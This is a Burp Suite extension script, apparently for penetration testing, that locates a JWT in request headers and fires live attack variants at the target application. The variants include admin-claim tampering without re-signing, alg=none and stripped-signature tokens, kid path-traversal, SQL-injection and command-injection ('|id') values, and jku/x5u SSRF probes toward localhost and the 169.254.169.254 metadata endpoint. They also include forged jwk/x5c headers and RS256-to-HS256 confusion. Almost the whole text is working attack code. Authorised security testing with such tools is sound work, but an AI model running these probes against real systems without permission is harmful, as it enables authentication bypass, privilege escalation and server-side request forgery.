// ================= JWT / BEARER TOKEN CHECKER =================
// Detect JWT by regex in Authorization and Cookie headers
// Focus: tampering, alg=none, signature removal, permission escalation,
// time-claim checks, aud/iss, kid/jku/x5u/jwk/x5c probes
// Logs only; does not send anything to Repeater

var jwtReq = requestResponse.request();
var jwtRes = requestResponse.response();

if (jwtRes == null) {
    logging.logToOutput("[!] No response available. Send the request first.");
    return;
}

var jwtRegex = java.util.regex.Pattern.compile("eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+(?:\\.[a-zA-Z0-9_-]*)?");
String locatedToken = null;
String tokenHeaderName = null;
String tokenHeaderValue = null;

for (var h : jwtReq.headers()) {
    String headerName = h.name();
    String headerValue = h.value();

    if (headerName.equalsIgnoreCase("Authorization") || headerName.equalsIgnoreCase("Cookie")) {
        var matcher = jwtRegex.matcher(headerValue);
        if (matcher.find()) {
            locatedToken = matcher.group();
            tokenHeaderName = headerName;
            tokenHeaderValue = headerValue;
            break;
        }
    }
}

if (locatedToken == null || locatedToken.isBlank()) {
    logging.logToOutput("[!] No JWT found by regex in Authorization/Cookie headers.");
    return;
}

final String finalLocatedToken = locatedToken;
final String finalTokenHeaderName = tokenHeaderName;
final String finalTokenHeaderValue = tokenHeaderValue;

var jwtParts = finalLocatedToken.split("\\.", -1);
if (jwtParts.length < 2) {
    logging.logToOutput("[!] Located token is not in JWT compact format.");
    return;
}

String headerPart = jwtParts[0];
String payloadPart = jwtParts[1];
String signaturePart = jwtParts.length > 2 ? jwtParts[2] : "";

java.util.function.Function<String, byte[]> b64UrlDecode = (input) -> {
    try {
        String normalized = input.replace('-', '+').replace('_', '/');
        int padding = (4 - (normalized.length() % 4)) % 4;
        normalized = normalized + "=".repeat(padding);
        return java.util.Base64.getDecoder().decode(normalized);
    } catch (Exception e) {
        return null;
    }
};

java.util.function.Function<String, String> b64UrlDecodeToString = (input) -> {
    byte[] out = b64UrlDecode.apply(input);
    return out == null ? null : new String(out, java.nio.charset.StandardCharsets.UTF_8);
};

java.util.function.Function<String, String> b64UrlEncode = (input) ->
    java.util.Base64.getUrlEncoder().withoutPadding()
        .encodeToString(input.getBytes(java.nio.charset.StandardCharsets.UTF_8));

String decodedHeader = b64UrlDecodeToString.apply(headerPart);
String decodedPayload = b64UrlDecodeToString.apply(payloadPart);

if (decodedHeader == null || decodedPayload == null) {
    logging.logToOutput("[!] Unable to decode JWT header/payload.");
    return;
}

burp.api.montoya.utilities.json.JsonNode headerJson;
burp.api.montoya.utilities.json.JsonNode payloadJson;

try {
    headerJson = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    payloadJson = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedPayload);
} catch (Exception e) {
    logging.logToOutput("[!] Decoded JWT header/payload is not valid JSON.");
    return;
}

var jwtFindings = new java.util.ArrayList<String>();
var jwtPassed = new java.util.ArrayList<String>();
var jwtManual = new java.util.ArrayList<String>();

java.util.function.Function<String, String> getResHeader = (name) -> {
    for (var h : jwtRes.headers()) {
        if (h.name().equalsIgnoreCase(name)) return h.value();
    }
    return null;
};

java.util.function.Function<burp.api.montoya.utilities.json.JsonNode, String> nodeToSimpleString = (node) -> {
    if (node == null) return null;
    try {
        if (node.isString()) return node.asString();
        return node.toJsonString();
    } catch (Exception e) {
        return node.toJsonString();
    }
};

var verboseErrorPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)\\bstack ?trace\\b"),
    java.util.regex.Pattern.compile("(?i)Traceback \\(most recent call last\\)"),
    java.util.regex.Pattern.compile("(?i)Whitelabel Error Page"),
    java.util.regex.Pattern.compile("(?i)Fatal error:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Warning:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Notice:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Caused by:"),
    java.util.regex.Pattern.compile("(?i)UnhandledPromiseRejection"),
    java.util.regex.Pattern.compile("(?i)TypeError:.*"),
    java.util.regex.Pattern.compile("(?i)ReferenceError:.*"),
    java.util.regex.Pattern.compile("(?i)SyntaxError:.*"),
    java.util.regex.Pattern.compile("(?i)\\bjava\\.lang\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bSystem\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bJsonWebTokenError\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjsonwebtoken\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjjwt\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjose\\b"),
    java.util.regex.Pattern.compile("(?i)\\borg\\.springframework\\.\\w+\\b")
);

java.util.function.Function<String, Boolean> hasVerboseError = (body) ->
    verboseErrorPatterns.stream().anyMatch(p -> p.matcher(body).find());

java.util.function.BiFunction<String, burp.api.montoya.utilities.json.JsonNode, String> buildToken = (headerStr, payloadNode) -> {
    String newHeaderB64 = b64UrlEncode.apply(headerStr);
    String newPayloadB64 = b64UrlEncode.apply(payloadNode.toJsonString());
    return newHeaderB64 + "." + newPayloadB64 + "." + signaturePart;
};

java.util.function.BiFunction<String, String, String> buildRawToken = (headerStr, payloadStr) -> {
    String newHeaderB64 = b64UrlEncode.apply(headerStr);
    String newPayloadB64 = b64UrlEncode.apply(payloadStr);
    return newHeaderB64 + "." + newPayloadB64 + "." + signaturePart;
};

java.util.function.Function<String, burp.api.montoya.http.message.requests.HttpRequest> withJwtReplaced = (newToken) -> {
    String newHeaderValue = finalTokenHeaderValue.replace(finalLocatedToken, newToken);
    return jwtReq.withUpdatedHeader(finalTokenHeaderName, newHeaderValue).withService(jwtReq.httpService());
};

// ===== BASELINE ANALYSIS =====

String algValue = null;
String typValue = null;
boolean hasJwkHeader = false;
boolean hasJkuHeader = false;
boolean hasKidHeader = false;
boolean hasX5uHeader = false;
boolean hasX5cHeader = false;

if (headerJson.isObject()) {
    var hm = headerJson.asObject().asMap();

    if (hm.containsKey("alg")) algValue = nodeToSimpleString.apply(hm.get("alg"));
    if (hm.containsKey("typ")) typValue = nodeToSimpleString.apply(hm.get("typ"));
    hasJwkHeader = hm.containsKey("jwk");
    hasJkuHeader = hm.containsKey("jku");
    hasKidHeader = hm.containsKey("kid");
    hasX5uHeader = hm.containsKey("x5u");
    hasX5cHeader = hm.containsKey("x5c");
}

logging.logToOutput("========== JWT / BEARER CHECKER ==========");
logging.logToOutput("[*] JWT source header: " + finalTokenHeaderName);
logging.logToOutput("[*] JWT header: " + decodedHeader);
logging.logToOutput("[*] JWT payload: " + decodedPayload);
logging.logToOutput("[*] alg=" + algValue + " | typ=" + typValue + " | parts=" + jwtParts.length);

if (algValue == null) jwtFindings.add("[HIGH] JWT missing alg field in header");
else jwtPassed.add("JWT contains alg field: " + algValue);

if ("none".equalsIgnoreCase(algValue)) jwtFindings.add("[CRITICAL] JWT baseline uses alg=none");
if (algValue != null && (algValue.equalsIgnoreCase("HS256") || algValue.equalsIgnoreCase("HS384") || algValue.equalsIgnoreCase("HS512"))) {
    jwtManual.add("JWT uses HMAC (" + algValue + ") - consider offline brute-forcing a weak secret");
}
if (algValue != null && (algValue.equalsIgnoreCase("RS256") || algValue.equalsIgnoreCase("RS384") || algValue.equalsIgnoreCase("RS512"))) {
    jwtManual.add("JWT uses RSA (" + algValue + ") - test RS256->HS256 confusion if a public key is exposed");
}
if (algValue != null && (algValue.equalsIgnoreCase("ES256") || algValue.equalsIgnoreCase("ES384") || algValue.equalsIgnoreCase("ES512"))) {
    jwtManual.add("JWT uses ECDSA (" + algValue + ") - validate library and implementation; nonce reuse requires offline analysis");
}

if (hasJwkHeader) jwtFindings.add("[HIGH] JWT header contains embedded jwk - potential key injection surface");
if (hasJkuHeader) jwtFindings.add("[HIGH] JWT header contains jku - potential JWKS spoofing / SSRF surface");
if (hasKidHeader) jwtManual.add("JWT header contains kid - test for path traversal, SQLi, or command injection in the key resolver");
if (hasX5uHeader) jwtFindings.add("[HIGH] JWT header contains x5u - potential SSRF / trusted key abuse surface");
if (hasX5cHeader) jwtFindings.add("[HIGH] JWT header contains x5c - assess certificate injection / trust abuse");

boolean hasExp = false;
boolean hasNbf = false;
boolean hasIat = false;
boolean hasAud = false;
boolean hasIss = false;
boolean hasJti = false;

if (payloadJson.isObject()) {
    var pm = payloadJson.asObject().asMap();
    hasExp = pm.containsKey("exp");
    hasNbf = pm.containsKey("nbf");
    hasIat = pm.containsKey("iat");
    hasAud = pm.containsKey("aud");
    hasIss = pm.containsKey("iss");
    hasJti = pm.containsKey("jti");

    if (!hasExp) jwtFindings.add("[HIGH] JWT missing exp claim");
    else jwtPassed.add("JWT contains exp claim");

    if (!hasIat) jwtFindings.add("[MEDIUM] JWT missing iat claim");
    else jwtPassed.add("JWT contains iat claim");

    if (!hasNbf) jwtManual.add("JWT missing nbf - verify whether the application enforces a minimum validity window");
    if (!hasAud) jwtManual.add("JWT missing aud - verify cross-service reuse");
    if (!hasIss) jwtManual.add("JWT missing iss - verify issuer validation");
    if (!hasJti) jwtManual.add("JWT missing jti - assess replay risk / lack of revocation");

    for (String key : pm.keySet()) {
        String lowered = key.toLowerCase();
        String valuePreview = pm.get(key).toJsonString();

        if (lowered.contains("password") || lowered.contains("secret") || lowered.contains("apikey") ||
            lowered.contains("api_key") || lowered.contains("token") || lowered.contains("hash")) {
            jwtFindings.add("[HIGH] Possible sensitive data in JWT claim: " + key + "=" + valuePreview);
        }

        if (lowered.equals("role") || lowered.equals("roles") || lowered.equals("scope") || lowered.equals("scp") ||
            lowered.equals("permissions") || lowered.equals("perm") || lowered.equals("isadmin") ||
            lowered.equals("admin") || lowered.equals("tenant") || lowered.equals("tenant_id")) {
            jwtManual.add("Privileged claim found: " + key + " - candidate for privilege escalation");
        }
    }
}

boolean jwtOverHttp = jwtReq.url().startsWith("http://");
if (jwtOverHttp) jwtFindings.add("[CRITICAL] JWT is being sent over HTTP");
else jwtPassed.add("JWT is being sent over HTTPS");

String hsts = getResHeader.apply("Strict-Transport-Security");
if (hsts == null) jwtManual.add("Response does not include HSTS - relevant for token transport protection");

// ===== DYNAMIC TEST HELPER =====

java.util.function.BiConsumer<String, String> testToken = (label, tokenToSend) -> {
    try {
        var mutatedReq = withJwtReplaced.apply(tokenToSend);
        if (mutatedReq.httpService() == null) {
            logging.logToOutput("[!] No HttpService for test: " + label);
            return;
        }

        var result = api.http().sendRequest(mutatedReq);
        if (result.response() == null) {
            logging.logToOutput("NONE [JWT] " + label + " | no response");
            return;
        }

        int st = result.response().statusCode();
        String body = result.response().bodyToString();
        String lowerBody = body.toLowerCase();
        boolean verbose = hasVerboseError.apply(body);

        if (st < 400
            && !lowerBody.contains("invalid token")
            && !lowerBody.contains("jwt malformed")
            && !lowerBody.contains("signature")
            && !lowerBody.contains("unauthorized")
            && !lowerBody.contains("forbidden")
            && !lowerBody.contains("expired")) {
            logging.logToOutput(st + " [HIT] JWT " + label);
        } else if (verbose) {
            logging.logToOutput(st + " [DEBUG] JWT " + label + " | verbose error exposed");
        } else {
            logging.logToOutput(st + " [OK] JWT " + label);
        }
    } catch (Exception e) {
        logging.logToOutput("[!] Exception during JWT test " + label + ": " + e.getMessage());
    }
};

// ===== DYNAMIC TESTS =====

// 1) Signature not verified / claim tampering without resigning
if (payloadJson.isObject()) {
    var pm = payloadJson.asObject().asMap();

    if (pm.containsKey("admin")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putBoolean("admin", true);
        testToken.accept("tamper-admin-without-resign", buildToken.apply(decodedHeader, p));
    }

    if (pm.containsKey("isAdmin")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putBoolean("isAdmin", true);
        testToken.accept("tamper-isAdmin-without-resign", buildToken.apply(decodedHeader, p));
    }

    if (pm.containsKey("role")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putString("role", "admin");
        testToken.accept("tamper-role-admin-without-resign", buildToken.apply(decodedHeader, p));
    }

    if (pm.containsKey("scope")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putString("scope", "admin superuser root *");
        testToken.accept("tamper-scope-without-resign", buildToken.apply(decodedHeader, p));
    }

    if (pm.containsKey("permissions")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putString("permissions", "[\"*\"]");
        testToken.accept("tamper-permissions-without-resign", buildToken.apply(decodedHeader, p));
    }

    if (!pm.containsKey("role") && !pm.containsKey("admin") && !pm.containsKey("isAdmin")) {
        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        p.asObject().putString("role", "admin");
        testToken.accept("inject-role-admin-without-resign", buildToken.apply(decodedHeader, p));
    }
}

// 2) alg=none
if (headerJson.isObject()) {
    var hNone = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hNone.asObject().putString("alg", "none");

    String noneHeader = hNone.toJsonString();
    String nonePayload = payloadJson.toJsonString();
    String noneToken = b64UrlEncode.apply(noneHeader) + "." + b64UrlEncode.apply(nonePayload) + ".";
    testToken.accept("alg-none-empty-signature", noneToken);

    String[] noneVariants = new String[]{"None", "NONE", "NoNe"};
    for (String variant : noneVariants) {
        var hv = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
        hv.asObject().putString("alg", variant);
        String tok = b64UrlEncode.apply(hv.toJsonString()) + "." + b64UrlEncode.apply(nonePayload) + ".";
        testToken.accept("alg-" + variant + "-empty-signature", tok);
    }
}

// 3) Remove signature entirely
String noSigToken = headerPart + "." + payloadPart + ".";
testToken.accept("remove-signature-keep-original-header-payload", noSigToken);

// 4) Empty / junk signature
String junkSigToken = headerPart + "." + payloadPart + ".AAAA";
testToken.accept("junk-signature", junkSigToken);

// 5) Time claim checks
if (payloadJson.isObject()) {
    long now = java.time.Instant.now().getEpochSecond();

    if (hasExp) {
        var pExpPast = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        pExpPast.asObject().putNumber("exp", now - 86400);
        testToken.accept("expired-exp-claim-without-resign", buildToken.apply(decodedHeader, pExpPast));

        var pExpFar = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        pExpFar.asObject().putNumber("exp", now + 315360000L);
        testToken.accept("excessive-exp-10-years-without-resign", buildToken.apply(decodedHeader, pExpFar));
    } else {
        testToken.accept("missing-exp-claim-current-token-shape", buildToken.apply(decodedHeader, payloadJson));
    }

    var pNbfFuture = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pNbfFuture.asObject().putNumber("nbf", now + 86400);
    testToken.accept("future-nbf-without-resign", buildToken.apply(decodedHeader, pNbfFuture));

    var pIatFuture = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pIatFuture.asObject().putNumber("iat", now + 86400);
    testToken.accept("future-iat-without-resign", buildToken.apply(decodedHeader, pIatFuture));
}

// 6) Audience / issuer / jti
if (payloadJson.isObject()) {
    var pAud = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pAud.asObject().putString("aud", "unexpected-service");
    testToken.accept("tamper-aud-without-resign", buildToken.apply(decodedHeader, pAud));

    var pIss = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pIss.asObject().putString("iss", "https://attacker.invalid/");
    testToken.accept("tamper-iss-without-resign", buildToken.apply(decodedHeader, pIss));

    var pJti = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pJti.asObject().putString("jti", "replay-test-fixed-jti");
    testToken.accept("tamper-jti-fixed-value-without-resign", buildToken.apply(decodedHeader, pJti));
}

// 7) Header abuse probes
if (headerJson.isObject()) {
    var hKidTrav = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidTrav.asObject().putString("kid", "../../../../../../dev/null");
    testToken.accept("kid-path-traversal", buildRawToken.apply(hKidTrav.toJsonString(), payloadJson.toJsonString()));

    var hKidSql = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidSql.asObject().putString("kid", "' OR '1'='1");
    testToken.accept("kid-sqli-probe", buildRawToken.apply(hKidSql.toJsonString(), payloadJson.toJsonString()));

    var hKidCmd = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidCmd.asObject().putString("kid", "|id");
    testToken.accept("kid-command-injection-probe", buildRawToken.apply(hKidCmd.toJsonString(), payloadJson.toJsonString()));

    var hJku = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hJku.asObject().putString("jku", "http://127.0.0.1:80/jwks.json");
    testToken.accept("jku-ssrf-probe-localhost", buildRawToken.apply(hJku.toJsonString(), payloadJson.toJsonString()));

    var hX5u = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hX5u.asObject().putString("x5u", "http://169.254.169.254/latest/meta-data/");
    testToken.accept("x5u-ssrf-probe-imds", buildRawToken.apply(hX5u.toJsonString(), payloadJson.toJsonString()));

    var hJwk = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hJwk.asObject().putString("jwk", "{\"kty\":\"RSA\",\"e\":\"AQAB\",\"n\":\"attacker\"}");
    testToken.accept("embedded-jwk-header-probe", buildRawToken.apply(hJwk.toJsonString(), payloadJson.toJsonString()));

    var hX5c = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hX5c.asObject().putString("x5c", "[\"MIIBfakeattackercert\"]");
    testToken.accept("x5c-certificate-injection-probe", buildRawToken.apply(hX5c.toJsonString(), payloadJson.toJsonString()));
}

// 8) RS256 -> HS256 structural probe
if (algValue != null && algValue.equalsIgnoreCase("RS256")) {
    var hConf = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hConf.asObject().putString("alg", "HS256");
    testToken.accept("rs256-to-hs256-confusion-structural-probe", buildRawToken.apply(hConf.toJsonString(), payloadJson.toJsonString()));
    jwtManual.add("For a complete RS256->HS256 confusion attack, obtain the public key/JWKS and sign HS256 with it as the secret");
}

// ===== FINAL REPORT =====

logging.logToOutput("--- JWT FINDINGS (" + jwtFindings.size() + ") ---");
for (String f : jwtFindings) logging.logToOutput(f);

logging.logToOutput("--- JWT PASSED (" + jwtPassed.size() + ") ---");
for (String p : jwtPassed) logging.logToOutput("[OK] " + p);

logging.logToOutput("--- JWT MANUAL REVIEW (" + jwtManual.size() + ") ---");
for (String m : jwtManual) logging.logToOutput("[MANUAL] " + m);

logging.logToOutput("========== END JWT CHECKER ==========");
